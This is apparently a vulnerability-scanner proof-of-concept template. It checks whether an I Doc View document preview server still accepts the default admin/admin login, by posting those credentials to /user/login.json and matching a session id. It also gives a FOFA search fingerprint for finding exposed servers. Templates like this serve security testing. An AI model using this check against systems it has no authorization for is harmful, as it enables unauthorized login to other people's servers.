id: poc-yaml-i-doc-view-odps-weak-password
info:
  name: I Doc View在线文档预览系统 弱口令漏洞
  severity: high
  tags:
  - rce
  finger: I Doc View
  fofa: I Doc View在线文档预览
requests:
- method: POST
  path: /user/login.json
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: user=admin&password=admin
  expression: status_code == 200 && matches(body,"\"sid\":\"[0-9A-Za-z]+\"") && contains(headers,"idocv")
    && contains(content_type,"application/json") && !contains(body,"<")
variables: {}
transport: http
